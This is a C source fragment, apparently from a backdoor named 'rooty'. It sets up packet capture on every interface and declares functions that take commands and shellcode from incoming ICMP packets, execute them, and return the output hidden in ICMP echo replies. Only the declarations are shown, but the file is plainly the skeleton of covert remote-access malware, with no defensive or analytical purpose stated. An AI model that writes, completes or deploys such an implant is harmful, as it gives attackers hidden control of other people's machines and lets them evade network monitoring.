#include "rooty.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <pcap.h>
#include <netdb.h>

#define INTERFACE "any"

// We need to keep track of the packet header type
int data_type = 0;

// Build response packets for sending
int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, ROOTY_MESSAGE *msg);

// Send response packet
void send_packet(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_hdr *icmp);

// Execute shellcode received from shellcode message
void run_shellcode(const unsigned char *shellcode, uint32_t size);

// Actually run the shellcode
void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack );

// Execute system command and send back the results via ICMP echo reply
void run_command(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_hdr *icmp);

// Process the received icmp message
void process_message(unsigned char *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp);
